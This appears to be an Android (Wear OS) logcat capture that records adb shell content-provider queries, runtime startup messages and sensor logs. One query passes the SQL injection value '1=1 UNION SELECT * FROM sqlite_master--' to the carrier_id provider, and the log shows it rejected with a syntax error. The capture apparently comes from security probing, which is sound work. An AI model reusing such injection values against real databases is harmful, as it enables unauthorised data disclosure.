06-30 03:20:00.696 20684 20684 D nativeloader: Load libopenjdk.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:20:00.700 20684 20684 I app_process: Priority-to-niceness mapping: 19, 16, 13, 10, 0, -2, -4, -5, -6, -8
06-30 03:20:00.820 20684 20684 D nativeloader: Load libframework-connectivity-tiramisu-jni.so using APEX ns com_android_tethering for caller /apex/com.android.tethering/javalib/framework-connectivity-t.jar: ok
06-30 03:20:00.821 20684 20684 D AndroidRuntime: Calling main entry com.android.commands.content.Content
06-30 03:20:00.832 20684 20684 I AconfigPackage: com.android.os.statsd.flags is mapped to com.android.os.statsd
06-30 03:20:00.834 20684 20684 I AconfigPackage: com.android.uprobestats.flags is mapped to com.android.uprobestats
06-30 03:20:00.834 20684 20684 I AconfigPackage: android.uprobestats.mainline.flags is mapped to com.android.uprobestats
06-30 03:20:00.835 20684 20684 I AconfigPackage: com.android.media.extractor.flags is mapped to com.android.media
06-30 03:20:00.835 20684 20684 I AconfigPackage: com.android.media.metrics.flags is mapped to com.android.media
06-30 03:20:00.835 20684 20684 I AconfigPackage: com.android.media.mainline.flags is mapped to com.android.media
06-30 03:20:00.836 20684 20684 I AconfigPackage: com.android.adservices.flags is mapped to com.android.adservices
06-30 03:20:00.836 20684 20684 I AconfigPackage: com.android.sdksandbox.flags is mapped to com.android.adservices
06-30 03:20:00.836 20684 20684 I AconfigPackage: android.app.sdksandbox.flags is mapped to com.android.adservices
06-30 03:20:00.837 20684 20684 I AconfigPackage: com.android.npumanager is mapped to com.android.npumanager
06-30 03:20:00.838 20684 20684 I AconfigPackage: com.android.appsearch.flags is mapped to com.android.appsearch
06-30 03:20:00.838 20684 20684 I AconfigPackage: com.android.crashrecovery.flags is mapped to com.android.crashrecovery
06-30 03:20:00.839 20684 20684 I AconfigPackage: com.android.tethering.mainline.beta is mapped to com.android.tethering
06-30 03:20:00.839 20684 20684 I AconfigPackage: android.net.http is mapped to com.android.tethering
06-30 03:20:00.839 20684 20684 I AconfigPackage: com.android.tethering.readonly.flags is mapped to com.android.tethering
06-30 03:20:00.839 20684 20684 I AconfigPackage: android.net.vcn is mapped to com.android.tethering
06-30 03:20:00.839 20684 20684 I AconfigPackage: com.android.net.flags is mapped to com.android.tethering
06-30 03:20:00.840 20684 20684 I AconfigPackage: com.android.tethering.flags is mapped to com.android.tethering
06-30 03:20:00.840 20684 20684 I AconfigPackage: com.android.tethering.beta.test is mapped to com.android.tethering
06-30 03:20:00.840 20684 20684 I AconfigPackage: com.android.nearby.flags is mapped to com.android.tethering
06-30 03:20:00.840 20684 20684 I AconfigPackage: com.android.net.thread.flags is mapped to com.android.tethering
06-30 03:20:00.840 20684 20684 I AconfigPackage: com.android.net.ct.flags is mapped to com.android.tethering
06-30 03:20:00.841 20684 20684 I AconfigPackage: com.android.nfc.module.flags is mapped to com.android.nfcservices
06-30 03:20:00.841 20684 20684 I AconfigPackage: com.android.nfc.module.nonexported.flags is mapped to com.android.nfcservices
06-30 03:20:00.842 20684 20684 I AconfigPackage: com.android.uwb.flags is mapped to com.android.uwb
06-30 03:20:00.842 20684 20684 I AconfigPackage: com.android.ranging.flags is mapped to com.android.uwb
06-30 03:20:00.843 20684 20684 I AconfigPackage: com.android.rkpd.flags is mapped to com.android.rkpd
06-30 03:20:00.844 20684 20684 I AconfigPackage: com.android.system.virtualmachine.flags is mapped to com.android.virt
06-30 03:20:00.845 20684 20684 I AconfigPackage: com.android.org.conscrypt.flags is mapped to com.android.conscrypt
06-30 03:20:00.845 20684 20684 I AconfigPackage: com.android.org.conscrypt.net.flags is mapped to com.android.conscrypt
06-30 03:20:00.846 20684 20684 I AconfigPackage: android.media.swcodec.flags is mapped to com.android.media.swcodec
06-30 03:20:00.847 20684 20684 I AconfigPackage: com.android.ipsec.flags is mapped to com.android.ipsec
06-30 03:20:00.848 20684 20684 I AconfigPackage: com.android.cellbroadcastreceiver.flags is mapped to com.android.cellbroadcast
06-30 03:20:00.849 20684 20684 I AconfigPackage: android.telecom.flags is mapped to com.android.telephonycore
06-30 03:20:00.849 20684 20684 I AconfigPackage: com.android.internal.telecom.flags is mapped to com.android.telephonycore
06-30 03:20:00.849 20684 20684 I AconfigPackage: com.android.telephony.flags is mapped to com.android.telephonycore
06-30 03:20:00.850 20684 20684 I AconfigPackage: com.android.devicelock.flags is mapped to com.android.devicelock
06-30 03:20:00.851 20684 20684 I AconfigPackage: com.android.permission.flags is mapped to com.android.permission
06-30 03:20:00.851 20684 20684 I AconfigPackage: com.android.permissioncontroller.flags is mapped to com.android.permission
06-30 03:20:00.851 20684 20684 I AconfigPackage: com.android.icu is mapped to com.android.i18n
06-30 03:20:00.852 20684 20684 I AconfigPackage: com.android.adservices.ondevicepersonalization.flags is mapped to com.android.ondevicepersonalization
06-30 03:20:00.853 20684 20684 I AconfigPackage: com.android.wifi.flags is mapped to com.android.wifi
06-30 03:20:00.853 20684 20684 I AconfigPackage: com.android.webapp.flags is mapped to com.android.webapp
06-30 03:20:00.854 20684 20684 I AconfigPackage: android.os.profiling is mapped to com.android.profiling
06-30 03:20:00.854 20684 20684 I AconfigPackage: android.os.profiling.anomaly.flags is mapped to com.android.profiling
06-30 03:20:00.854 20684 20684 I AconfigPackage: com.android.healthfitness.flags is mapped to com.android.healthfitness
06-30 03:20:00.855 20684 20684 I AconfigPackage: com.android.art.flags is mapped to com.android.art
06-30 03:20:00.855 20684 20684 I AconfigPackage: com.android.art.rw.flags is mapped to com.android.art
06-30 03:20:00.855 20684 20684 I AconfigPackage: com.android.libcore is mapped to com.android.art
06-30 03:20:00.856 20684 20684 I AconfigPackage: android.provider.flags is mapped to com.android.configinfrastructure
06-30 03:20:00.856 20684 20684 I AconfigPackage: com.android.server.deviceconfig is mapped to com.android.configinfrastructure
06-30 03:20:00.856 20684 20684 I AconfigPackage: com.google.android.widevine.flags is mapped to com.google.android.widevine
06-30 03:20:00.857 20684 20684 I AconfigPackage: com.android.adbd.flags is mapped to com.android.adbd
06-30 03:20:00.858 20684 20684 I AconfigPackage: android.graphics.pdf.flags is mapped to com.android.mediaprovider
06-30 03:20:00.858 20684 20684 I AconfigPackage: com.android.providers.media.flags is mapped to com.android.mediaprovider
06-30 03:20:00.858 20684 20684 I AconfigPackage: android.graphics.pdf.flags.readonly is mapped to com.android.mediaprovider
06-30 03:20:00.859 20684 20684 I AconfigPackage: com.android.bluetooth.beta.flags is mapped to com.android.bt
06-30 03:20:00.859 20684 20684 I AconfigPackage: com.android.bluetooth.flags is mapped to com.android.bt
06-30 03:20:00.860 20684 20684 E FeatureFlagsImplExport: android.os.flagging.AconfigStorageReadException: ERROR_PACKAGE_NOT_FOUND: package android.xr cannot be found on the device
06-30 03:20:00.899   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c003000
06-30 03:20:00.972  2109  3527 E DatabaseUtils: Writing exception to parcel
06-30 03:20:00.972  2109  3527 E DatabaseUtils: java.lang.IllegalArgumentException: No matching uri.
06-30 03:20:00.972  2109  3527 E DatabaseUtils: 	at okio.Buffer$$ExternalSyntheticBUOutline0.m(go/retraceme 70d7290c06ecd7036d4c88cd79b0822e07343b7251d29d9eb53cf044b5e160a8:24)
06-30 03:20:00.972  2109  3527 E DatabaseUtils: 	at com.google.wear.services.watchfaces.favorites.persistence.WatchFaceInstancesContentProvider.query(go/retraceme 70d7290c06ecd7036d4c88cd79b0822e07343b7251d29d9eb53cf044b5e160a8:165)
06-30 03:20:00.972  2109  3527 E DatabaseUtils: 	at android.content.ContentProvider.query(ContentProvider.java:1670)
06-30 03:20:00.972  2109  3527 E DatabaseUtils: 	at android.content.ContentProvider.query(ContentProvider.java:1766)
06-30 03:20:00.972  2109  3527 E DatabaseUtils: 	at android.content.ContentProvider$Transport.query(ContentProvider.java:304)
06-30 03:20:00.972  2109  3527 E DatabaseUtils: 	at android.content.ContentProviderNative.onTransact(ContentProviderNative.java:109)
06-30 03:20:00.972  2109  3527 E DatabaseUtils: 	at android.os.Binder.execTransactInternal(Binder.java:1364)
06-30 03:20:00.972  2109  3527 E DatabaseUtils: 	at android.os.Binder.execTransact(Binder.java:1323)
06-30 03:20:00.979 20684 20684 D AndroidRuntime: Shutting down VM
06-30 03:20:00.980 20684 20693 W libbinder.IPCThreadState: call to talkWithDriver in joinThreadPool returned error: -9 (Bad file descriptor), FD: -1
06-30 03:20:00.980 20684 20694 W libbinder.IPCThreadState: call to talkWithDriver in joinThreadPool returned error: -9 (Bad file descriptor), FD: -1
06-30 03:20:00.996   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:20:01.003  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:20:01.014  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:20:01.212   721   859 D MCU     : calories_consumer.cc:157         16:34:51.611 Calories OnSample timestamp_ns=58005807647705 total=1.05
06-30 03:20:01.212   721   859 D MCU     : offload_data_provider_app.cc:1190 16:34:51.612 [OffloadDataProvider] Got Calories, total=290.85
06-30 03:20:01.629  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:20:01.629  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:20:01.635  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:20:01.639  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:20:01.640  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:20:01.640  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:20:01.641  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:20:01.642  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:20:01.644  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:20:01.644  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:20:01.751   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:20:01.864  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:content query --uri 'content://carrier_id/all' --where '1=1 UNION SELECT * FROM sqlite_master--''
06-30 03:20:02.285 20697 20697 D AndroidRuntime: >>>>>> START com.android.internal.os.RuntimeInit uid 2000 <<<<<<
06-30 03:20:02.305 20697 20697 I AndroidRuntime: Using default boot image
06-30 03:20:02.306 20697 20697 I AndroidRuntime: Leaving lock profiling enabled
06-30 03:20:02.320 20697 20697 I app_process: Core platform API enforcement enabled from the hiddenapi_platform_enforcement flag and the device API level
06-30 03:20:02.323 20697 20697 I app_process: Using generational CollectorTypeCMC GC.
06-30 03:20:02.554 20697 20697 W app_process: Bump pointer space is not aligned to 2048KB. This can lead to longer stop-the-world pauses for compaction
06-30 03:20:02.610 20697 20697 D nativeloader: InitDefaultPublicLibraries for_preload=1: libandroid.so:libaaudio.so:libamidi.so:libbinder_ndk.so:libc.so:libcamera2ndk.so:libdl.so:libEGL.so:libGLESv1_CM.so:libGLESv2.so:libGLESv3.so:libicu.so:libicui18n.so:libicuuc.so:libjnigraphics.so:liblog.so:libmediandk.so:libm.so:libnativehelper.so:libnativewindow.so:libneuralnetworks.so:libOpenMAXAL.so:libOpenSLES.so:libRS.so:libstdc++.so:libsync.so:libvulkan.so:libz.so
06-30 03:20:02.653 20697 20697 D nativeloader: Load libicu_jni.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:20:02.654 20697 20697 D app_process: u_setTimeZoneFilesDirectory("/apex/com.android.tzdata/etc/tz/versioned/10/icu") succeeded. 
06-30 03:20:02.654 20697 20697 D app_process: I18n APEX ICU file found: /apex/com.android.i18n/etc/icu/icudt78l.dat
06-30 03:20:02.657 20697 20697 D nativeloader: Load libjavacore.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:20:02.661 20697 20697 D nativeloader: Load libopenjdk.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:20:02.664 20697 20697 I app_process: Priority-to-niceness mapping: 19, 16, 13, 10, 0, -2, -4, -5, -6, -8
06-30 03:20:02.781 20697 20697 D nativeloader: Load libframework-connectivity-tiramisu-jni.so using APEX ns com_android_tethering for caller /apex/com.android.tethering/javalib/framework-connectivity-t.jar: ok
06-30 03:20:02.782 20697 20697 D AndroidRuntime: Calling main entry com.android.commands.content.Content
06-30 03:20:02.794 20697 20697 I AconfigPackage: com.android.os.statsd.flags is mapped to com.android.os.statsd
06-30 03:20:02.795 20697 20697 I AconfigPackage: com.android.uprobestats.flags is mapped to com.android.uprobestats
06-30 03:20:02.796 20697 20697 I AconfigPackage: android.uprobestats.mainline.flags is mapped to com.android.uprobestats
06-30 03:20:02.796 20697 20697 I AconfigPackage: com.android.media.extractor.flags is mapped to com.android.media
06-30 03:20:02.796 20697 20697 I AconfigPackage: com.android.media.metrics.flags is mapped to com.android.media
06-30 03:20:02.796 20697 20697 I AconfigPackage: com.android.media.mainline.flags is mapped to com.android.media
06-30 03:20:02.797 20697 20697 I AconfigPackage: com.android.adservices.flags is mapped to com.android.adservices
06-30 03:20:02.797 20697 20697 I AconfigPackage: com.android.sdksandbox.flags is mapped to com.android.adservices
06-30 03:20:02.797 20697 20697 I AconfigPackage: android.app.sdksandbox.flags is mapped to com.android.adservices
06-30 03:20:02.798 20697 20697 I AconfigPackage: com.android.npumanager is mapped to com.android.npumanager
06-30 03:20:02.799 20697 20697 I AconfigPackage: com.android.appsearch.flags is mapped to com.android.appsearch
06-30 03:20:02.801 20697 20697 I AconfigPackage: com.android.crashrecovery.flags is mapped to com.android.crashrecovery
06-30 03:20:02.802 20697 20697 I AconfigPackage: com.android.tethering.mainline.beta is mapped to com.android.tethering
06-30 03:20:02.802 20697 20697 I AconfigPackage: android.net.http is mapped to com.android.tethering
06-30 03:20:02.802 20697 20697 I AconfigPackage: com.android.tethering.readonly.flags is mapped to com.android.tethering
06-30 03:20:02.803 20697 20697 I AconfigPackage: android.net.vcn is mapped to com.android.tethering
06-30 03:20:02.803 20697 20697 I AconfigPackage: com.android.net.flags is mapped to com.android.tethering
06-30 03:20:02.803 20697 20697 I AconfigPackage: com.android.tethering.flags is mapped to com.android.tethering
06-30 03:20:02.803 20697 20697 I AconfigPackage: com.android.tethering.beta.test is mapped to com.android.tethering
06-30 03:20:02.803 20697 20697 I AconfigPackage: com.android.nearby.flags is mapped to com.android.tethering
06-30 03:20:02.803 20697 20697 I AconfigPackage: com.android.net.thread.flags is mapped to com.android.tethering
06-30 03:20:02.803 20697 20697 I AconfigPackage: com.android.net.ct.flags is mapped to com.android.tethering
06-30 03:20:02.804 20697 20697 I AconfigPackage: com.android.nfc.module.flags is mapped to com.android.nfcservices
06-30 03:20:02.804 20697 20697 I AconfigPackage: com.android.nfc.module.nonexported.flags is mapped to com.android.nfcservices
06-30 03:20:02.805 20697 20697 I AconfigPackage: com.android.uwb.flags is mapped to com.android.uwb
06-30 03:20:02.805 20697 20697 I AconfigPackage: com.android.ranging.flags is mapped to com.android.uwb
06-30 03:20:02.805 20697 20697 I AconfigPackage: com.android.rkpd.flags is mapped to com.android.rkpd
06-30 03:20:02.806 20697 20697 I AconfigPackage: com.android.system.virtualmachine.flags is mapped to com.android.virt
06-30 03:20:02.807 20697 20697 I AconfigPackage: com.android.org.conscrypt.flags is mapped to com.android.conscrypt
06-30 03:20:02.807 20697 20697 I AconfigPackage: com.android.org.conscrypt.net.flags is mapped to com.android.conscrypt
06-30 03:20:02.807 20697 20697 I AconfigPackage: android.media.swcodec.flags is mapped to com.android.media.swcodec
06-30 03:20:02.808 20697 20697 I AconfigPackage: com.android.ipsec.flags is mapped to com.android.ipsec
06-30 03:20:02.808 20697 20697 I AconfigPackage: com.android.cellbroadcastreceiver.flags is mapped to com.android.cellbroadcast
06-30 03:20:02.809 20697 20697 I AconfigPackage: android.telecom.flags is mapped to com.android.telephonycore
06-30 03:20:02.809 20697 20697 I AconfigPackage: com.android.internal.telecom.flags is mapped to com.android.telephonycore
06-30 03:20:02.810 20697 20697 I AconfigPackage: com.android.telephony.flags is mapped to com.android.telephonycore
06-30 03:20:02.810 20697 20697 I AconfigPackage: com.android.devicelock.flags is mapped to com.android.devicelock
06-30 03:20:02.811 20697 20697 I AconfigPackage: com.android.permission.flags is mapped to com.android.permission
06-30 03:20:02.811 20697 20697 I AconfigPackage: com.android.permissioncontroller.flags is mapped to com.android.permission
06-30 03:20:02.812 20697 20697 I AconfigPackage: com.android.icu is mapped to com.android.i18n
06-30 03:20:02.813 20697 20697 I AconfigPackage: com.android.adservices.ondevicepersonalization.flags is mapped to com.android.ondevicepersonalization
06-30 03:20:02.814 20697 20697 I AconfigPackage: com.android.wifi.flags is mapped to com.android.wifi
06-30 03:20:02.815 20697 20697 I AconfigPackage: com.android.webapp.flags is mapped to com.android.webapp
06-30 03:20:02.816 20697 20697 I AconfigPackage: android.os.profiling is mapped to com.android.profiling
06-30 03:20:02.816 20697 20697 I AconfigPackage: android.os.profiling.anomaly.flags is mapped to com.android.profiling
06-30 03:20:02.817 20697 20697 I AconfigPackage: com.android.healthfitness.flags is mapped to com.android.healthfitness
06-30 03:20:02.818 20697 20697 I AconfigPackage: com.android.art.flags is mapped to com.android.art
06-30 03:20:02.818 20697 20697 I AconfigPackage: com.android.art.rw.flags is mapped to com.android.art
06-30 03:20:02.818 20697 20697 I AconfigPackage: com.android.libcore is mapped to com.android.art
06-30 03:20:02.819 20697 20697 I AconfigPackage: android.provider.flags is mapped to com.android.configinfrastructure
06-30 03:20:02.819 20697 20697 I AconfigPackage: com.android.server.deviceconfig is mapped to com.android.configinfrastructure
06-30 03:20:02.820 20697 20697 I AconfigPackage: com.google.android.widevine.flags is mapped to com.google.android.widevine
06-30 03:20:02.821 20697 20697 I AconfigPackage: com.android.adbd.flags is mapped to com.android.adbd
06-30 03:20:02.821 20697 20697 I AconfigPackage: android.graphics.pdf.flags is mapped to com.android.mediaprovider
06-30 03:20:02.822 20697 20697 I AconfigPackage: com.android.providers.media.flags is mapped to com.android.mediaprovider
06-30 03:20:02.822 20697 20697 I AconfigPackage: android.graphics.pdf.flags.readonly is mapped to com.android.mediaprovider
06-30 03:20:02.822 20697 20697 I AconfigPackage: com.android.bluetooth.beta.flags is mapped to com.android.bt
06-30 03:20:02.823 20697 20697 I AconfigPackage: com.android.bluetooth.flags is mapped to com.android.bt
06-30 03:20:02.823 20697 20697 E FeatureFlagsImplExport: android.os.flagging.AconfigStorageReadException: ERROR_PACKAGE_NOT_FOUND: package android.xr cannot be found on the device
06-30 03:20:02.832  2305  3994 E SQLiteLog: (1) near "UNION": syntax error in "SELECT * FROM carrier_id WHERE (1=1 UNION SELECT * FROM sqlite_master--)"
06-30 03:20:02.833  2305  3994 E DatabaseUtils: Writing exception to parcel
06-30 03:20:02.833  2305  3994 E DatabaseUtils: android.database.sqlite.SQLiteException: near "UNION": syntax error (code 1 SQLITE_ERROR): , while compiling: SELECT * FROM carrier_id WHERE (1=1 UNION SELECT * FROM sqlite_master--)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.database.sqlite.SQLiteConnection.nativePrepareStatement(Native Method)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.database.sqlite.SQLiteConnection.-$$Nest$smnativePrepareStatement(SQLiteConnection.java:0)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.database.sqlite.SQLiteConnection$PreparedStatementCache.createStatement(SQLiteConnection.java:1627)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.database.sqlite.SQLiteConnection.acquirePreparedStatementLI(SQLiteConnection.java:1117)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.database.sqlite.SQLiteConnection.acquirePreparedStatement(SQLiteConnection.java:1145)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.database.sqlite.SQLiteConnection.prepare(SQLiteConnection.java:708)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.database.sqlite.SQLiteSession.prepare(SQLiteSession.java:625)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.database.sqlite.SQLiteProgram.<init>(SQLiteProgram.java:62)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.database.sqlite.SQLiteQuery.<init>(SQLiteQuery.java:37)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.database.sqlite.SQLiteDirectCursorDriver.query(SQLiteDirectCursorDriver.java:46)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.database.sqlite.SQLiteDatabase.rawQueryWithFactory(SQLiteDatabase.java:1849)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.database.sqlite.SQLiteQueryBuilder.query(SQLiteQueryBuilder.java:601)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.database.sqlite.SQLiteQueryBuilder.query(SQLiteQueryBuilder.java:472)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at com.android.providers.telephony.CarrierIdProvider.query(CarrierIdProvider.java:238)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.content.ContentProvider.query(ContentProvider.java:1670)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.content.ContentProvider.query(ContentProvider.java:1766)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.content.ContentProvider$Transport.query(ContentProvider.java:304)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.content.ContentProviderNative.onTransact(ContentProviderNative.java:109)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.os.Binder.execTransactInternal(Binder.java:1364)
06-30 03:20:02.833  2305  3994 E DatabaseUtils: 	at android.os.Binder.execTransact(Binder.java:1323)
06-30 03:20:02.838 20697 20705 W libbinder.IPCThreadState: call to talkWithDriver in joinThreadPool returned error: -9 (Bad file descriptor), FD: -1
06-30 03:20:02.838 20697 20706 W libbinder.IPCThreadState: call to talkWithDriver in joinThreadPool returned error: -9 (Bad file descriptor), FD: -1
06-30 03:20:02.838 20697 20697 D AndroidRuntime: Shutting down VM
06-30 03:20:04.670  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:20:04.671  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:20:04.680  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:20:04.684  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:20:04.686  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:20:04.687  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:20:04.687  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:20:04.688  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:20:04.690  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:20:04.690  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:20:07.685   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c003000
06-30 03:20:07.715   721   859 D MCU     : site_data_provider.cc:220        16:34:58.606 [SiteDataProvider] Flushing 1 GROK records
06-30 03:20:07.716  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:20:07.716   721   859 D MCU     : site_data_provider.cc:220        16:34:58.606 [SiteDataProvider] Flushing 1 GROK records
06-30 03:20:07.716  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:20:07.716  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:20:07.721  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:20:07.726  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:20:07.727  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:20:07.727  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:20:07.727  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:20:07.727  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:20:07.728  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:20:10.729   721   859 D MCU     : usf_sensor.cc:1920               16:35:01.342 [USF] Received start sampling request for Skin temperature sensor (active:1).
06-30 03:20:10.729   721   859 D MCU     : device.cc:154                    16:35:01.343 AS6221Device Set conversion timer: 60000000 ns
06-30 03:20:10.729   721   859 D MCU     : device.cc:173                    16:35:01.343 AS6221Device Set sampling timer:180000000
06-30 03:20:10.730   721   859 D MCU     : skin_temperature_manager.cc:333  16:35:01.406 [SkinTemperature] [Record Processing Incomplete] Processed 0 temperature samples.
06-30 03:20:10.746  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:20:13.783  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:20:15.733   721   859 I MCU     : nano_calibration.cc:343          16:35:06.694 [ImuCal] [GYRO_RPS] (s0, c0) Offset | Temp [C] | Quality: 0.001301, -0.005322, -0.000329 | 32.69 | 4
06-30 03:20:15.734   721   859 I MCU     : nano_calibration.cc:349          16:35:06.694 [ImuCal] [GYRO_RPS] (s0) Temp Sensitivity: 0.000050, -0.000025, -0.000019
06-30 03:20:15.734   721   859 I MCU     : nano_calibration.cc:352          16:35:06.694 [ImuCal] [GYRO_RPS] (s0) Temp Intercept: -0.000425, -0.004604, 0.000208
06-30 03:20:16.839  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:20:16.841  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:20:16.843  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:20:16.848  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:20:16.848  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:20:16.848  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:20:16.850  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:20:16.851  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:20:16.853  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:20:16.854  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:20:17.005   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:20:17.496  1719  1736 I system_server: Background young concurrent mark compact GC freed 3685KB AllocSpace bytes, 10(200KB) LOS objects, 87% free, 31MB/256MB, paused 4.190ms,6.844ms total 122.309ms
06-30 03:20:19.698  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:content query --uri content://com.google.wear.services.watchface.favorites.preview/path'
06-30 03:20:19.877  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:20:20.122 20708 20708 D AndroidRuntime: >>>>>> START com.android.internal.os.RuntimeInit uid 2000 <<<<<<
06-30 03:20:20.140 20708 20708 I AndroidRuntime: Using default boot image
06-30 03:20:20.140 20708 20708 I AndroidRuntime: Leaving lock profiling enabled
06-30 03:20:20.155 20708 20708 W app_process: Could not reserve sentinel fault page
06-30 03:20:20.155 20708 20708 I app_process: Core platform API enforcement enabled from the hiddenapi_platform_enforcement flag and the device API level
06-30 03:20:20.158 20708 20708 I app_process: Using generational CollectorTypeCMC GC.
06-30 03:20:20.379 20708 20708 W app_process: Bump pointer space is not aligned to 2048KB. This can lead to longer stop-the-world pauses for compaction
06-30 03:20:20.433 20708 20708 D nativeloader: InitDefaultPublicLibraries for_preload=1: libandroid.so:libaaudio.so:libamidi.so:libbinder_ndk.so:libc.so:libcamera2ndk.so:libdl.so:libEGL.so:libGLESv1_CM.so:libGLESv2.so:libGLESv3.so:libicu.so:libicui18n.so:libicuuc.so:libjnigraphics.so:liblog.so:libmediandk.so:libm.so:libnativehelper.so:libnativewindow.so:libneuralnetworks.so:libOpenMAXAL.so:libOpenSLES.so:libRS.so:libstdc++.so:libsync.so:libvulkan.so:libz.so
06-30 03:20:20.477 20708 20708 D nativeloader: Load libicu_jni.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:20:20.478 20708 20708 D app_process: u_setTimeZoneFilesDirectory("/apex/com.android.tzdata/etc/tz/versioned/10/icu") succeeded. 
06-30 03:20:20.478 20708 20708 D app_process: I18n APEX ICU file found: /apex/com.android.i18n/etc/icu/icudt78l.dat
06-30 03:20:20.480 20708 20708 D nativeloader: Load libjavacore.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:20:20.484 20708 20708 D nativeloader: Load libopenjdk.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:20:20.488 20708 20708 I app_process: Priority-to-niceness mapping: 19, 16, 13, 10, 0, -2, -4, -5, -6, -8
06-30 03:20:20.607 20708 20708 D nativeloader: Load libframework-connectivity-tiramisu-jni.so using APEX ns com_android_tethering for caller /apex/com.android.tethering/javalib/framework-connectivity-t.jar: ok
